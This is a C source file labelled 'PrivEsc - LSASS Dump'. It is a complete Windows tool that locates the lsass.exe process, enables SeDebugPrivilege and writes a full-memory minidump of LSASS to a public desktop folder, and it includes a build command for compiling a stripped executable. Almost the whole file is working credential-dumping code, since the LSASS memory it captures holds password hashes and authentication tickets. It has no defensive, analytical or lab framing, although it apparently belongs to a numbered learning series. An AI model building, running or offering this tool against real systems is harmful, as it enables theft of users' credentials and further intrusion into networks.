/*
    PrivEsc - LSASS Dump
    23 Jan 2025
    Eric

    To build: x86_64-w64-mingw32-gcc 04_dump_lsass.c -o dump.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -ldbghelp
*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#pragma comment (lib, "dbghelp.lib")


const char *targetProcess = "lsass.exe"; // process to find
LPCWSTR dumpFile = L"C:\\Users\\Public\\Desktop\\lsass.dmp"; // where the proc dump should go, the dir should already exist, else CreateFile will fail

// my custom code, find a specific process
DWORD findProcess(const char *procName) {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    DWORD winlogonPID = 0;

    // Take a snapshot of all processes in the system.
    // https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve information about the first process.
    if (Process32First(hProcessSnap, &pe32)) {
        do {
            // Check if the process name matches (0 indicates identical)
            if (_stricmp(pe32.szExeFile, procName) == 0) {
                winlogonPID = pe32.th32ProcessID;
                break; // Exit the loop once we find the process
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }

    // Clean up the snapshot object.
    CloseHandle(hProcessSnap);
    return winlogonPID;
}

// set privilege
BOOL setPrivilege(LPCTSTR priv) {
    HANDLE token;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    BOOL res = TRUE;

    // takes the name of the privilege from arg and attempts to find it in system
    // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluew   
    if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;
    
    // attempt to open the proc token with the ability to adjust privs
    // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token)) res = FALSE;

    // create a new token priv object and enable the privilege
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // use the token priv object to enable the privilege
    // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges
    if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;

    // cleanup
    CloseHandle(token);
    printf(res ? "privilege enabled %s\n" : "failed to enable privilege %s \n", priv);
    return res;
}

// create minidump of lsass.exe
BOOL generateMiniDump() {
  BOOL dumpSuccess = FALSE;
  DWORD processID = findProcess(targetProcess);
  HANDLE processHandle = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, processID);
  HANDLE outputHandle = CreateFileW(dumpFile, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  if (processHandle && outputHandle != INVALID_HANDLE_VALUE) {
    // dump proc with mem
    // https://learn.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump
    dumpSuccess = MiniDumpWriteDump(processHandle, processID, outputHandle, MiniDumpWithFullMemory, NULL, NULL, NULL);
    printf(dumpSuccess ? "successfully dumped to lsass.dmp\n" : "failed to dump\n");
  } 
  // error handle if the process is not found or an error in dumping the process
  else{
    if (processHandle == NULL) {
            printf("Error: Unable to open process with ID %lu. Error code: %lu\n", processID, GetLastError());
        }
    if (outputHandle == INVALID_HANDLE_VALUE) {
        printf("Error: Unable to create dump file. Error code: %lu\n", GetLastError());
    }
  }
  return dumpSuccess; 
}

int main(int argc, char** argv) {
  if (!setPrivilege(SE_DEBUG_NAME)) return -1;
  if (!generateMiniDump()) return -1;
  return 0;
}